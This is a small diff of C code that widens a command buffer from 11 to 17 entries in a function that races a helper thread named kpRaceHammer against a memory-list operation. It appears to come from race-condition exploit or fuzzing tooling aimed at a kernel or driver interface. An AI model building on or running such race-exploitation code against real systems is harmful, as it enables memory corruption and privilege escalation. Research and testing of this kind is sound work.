@@ -5582,7 +5582,7 @@ static void *kpListReaderMulti(void *arg)
     }
     uint64_t vaA = 0;
     {
-        uint64_t cmd[11]; memset(cmd, 0, sizeof cmd);
+        uint64_t cmd[17]; memset(cmd, 0, sizeof cmd);
         cmd[0] = 0x80;
         cmd[4] = (uint64_t)mem;
         cmd[5] = 0x8000;
@@ -5637,7 +5637,7 @@ static void *kpListReaderMulti(void *arg)
         pthread_create(&ht, NULL, kpRaceHammer, NULL);
         int hits = 0, other = 0;
         for (int it = 0; it < 500 && !hits; it++) {
-            uint64_t cmd[11]; memset(cmd, 0, sizeof cmd);
+            uint64_t cmd[17]; memset(cmd, 0, sizeof cmd);
             cmd[0] = 0x80;
             cmd[4] = (uint64_t)mem;
             cmd[5] = 0x8000;
